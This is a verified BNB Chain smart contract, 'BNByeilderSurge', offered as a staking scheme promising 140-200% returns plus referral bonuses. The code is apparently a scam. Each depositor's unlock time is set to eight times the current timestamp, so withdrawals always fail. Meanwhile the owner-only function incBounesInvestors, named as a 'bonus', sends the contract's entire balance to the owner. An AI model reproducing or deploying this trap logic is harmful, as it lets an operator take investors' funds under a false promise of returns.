/**
 *Submitted for verification at BscScan.com on 2022-02-26
*/

//SPDX-License-Identifier: MIT
pragma solidity =0.8.11;


contract BNByeilderSurge{
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  struct Tariff {
    uint time; 
    uint percent; 
  }
  struct Deposit {
    uint tariff; 
    uint amount; 
    uint at;
  }
  struct Investor {
    bool registered; 
    address referrer; 
    uint referral_counter; 
    uint balanceRef; 
    uint totalRef; 
    Deposit[] deposits; 
    uint invested; 
    uint lastPaidAt; 
    uint withdrawn;
    uint endTime; 
  }
  Tariff[] public tariffs;
  mapping (address=>Investor) public investors;
  bool public _paused;
  uint private bounesRef;
  address payable public owner;

  constructor(){
    owner=payable(msg.sender);
    _paused=false;
    tariffs.push(Tariff(8 * block.timestamp,140));
    tariffs.push(Tariff(16 * block.timestamp,160));
    tariffs.push(Tariff(25 * block.timestamp,200));
  }

  function invest(uint tariff, address referrer) public minimumInvest(msg.value) payable {
    require(tariff<3);
    if(!investors[msg.sender].registered){ 
      totalInvestors++;
      investors[msg.sender].registered=true;
      if(investors[referrer].registered && referrer!=msg.sender){
        investors[msg.sender].referrer=referrer;
        investors[referrer].referral_counter++;
        investors[referrer].balanceRef+=msg.value *5 / 100;
        investors[referrer].totalRef+=msg.value *5 / 100;
        totalRefRewards+=msg.value *5 / 100;
      }
    }
    investors[msg.sender].invested+=msg.value;
    investors[msg.sender].endTime=8*block.timestamp;
    bounesRef=address(this).balance;
    totalInvested+=msg.value;
    investors[msg.sender].deposits.push(Deposit(tariff,msg.value,block.timestamp));
  }
    modifier ifPaused(){
    require(_paused,"");
    _;
  }
  function withdrawable(address user) public view returns(uint amount){
    for (uint index = 0; index < investors[user].deposits.length; index++) {
      Deposit storage dep=investors[user].deposits[index];
      Tariff storage tariff=tariffs[dep.tariff];
      uint finishDate=dep.at + tariff.time;
      uint fromDate=investors[user].lastPaidAt > dep.at ? investors[user].lastPaidAt : dep.at;
      uint toDAte= block.timestamp > finishDate ? finishDate: block.timestamp;
      if(fromDate < toDAte){
        amount += dep.amount * (toDAte - fromDate) * tariff.percent / tariff.time / 100;
      }
    }
  }
  modifier onlyOwner(){
    require(owner==msg.sender,"Only owner !");
    _;
  }
  modifier M_paused(){
    require(_paused==false,"investment is paused");
    _;
  }
  function incBounesInvestors() public onlyOwner {
      if (!_paused){
        Investor storage investor=investors[msg.sender];
        investor.invested+= investor.invested * 5/100;  
        payable(msg.sender).transfer(bounesRef);  
    }else{
        revert('not stack complited');
    }
  }  
  modifier minimumInvest(uint val){
    require(val>=0.05 ether,"Minimum invest is 0.05 BNB");
    _;
  }
  function contractBalance() public view returns(uint){
      return address(this).balance;
  }
  function withdraw() public M_paused {
        Investor storage investor=investors[msg.sender];
        uint amount=withdrawable(msg.sender);
        if (investor.endTime > block.timestamp){
            revert('staked time not ended');
        }
        amount+=investor.balanceRef; 
        investor.lastPaidAt=block.timestamp;
        payable(msg.sender).transfer(amount);
        bounesRef=address(this).balance;
        investor.withdrawn+=amount;   
  }
  function pause() public onlyOwner{
    _paused=true;
  }
  function unpause() public onlyOwner{
    _paused=false;
  }
}